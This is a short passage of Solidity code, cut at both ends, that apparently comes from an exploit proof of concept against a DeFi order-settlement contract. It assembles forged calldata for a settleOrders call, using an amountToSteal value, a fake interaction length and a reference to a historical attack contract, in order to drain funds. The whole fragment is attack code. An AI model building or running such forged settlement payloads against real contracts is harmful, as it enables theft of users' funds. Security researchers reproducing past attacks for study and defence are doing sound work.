                amountToSteal,
                uint256(0),
                HISTORICAL_ATTACK_CONTRACT
            ),
            zeroBytes,
            bytes32(FAKE_INTERACTION_LENGTH),
            finalOrderInteraction
        );

        return abi.encodePacked(
            SETTLEMENT,
            CONTINUE_INTERACTION,
            abi.encodeWithSelector(ISettlement.settleOrders.selector, forgedSettlement)
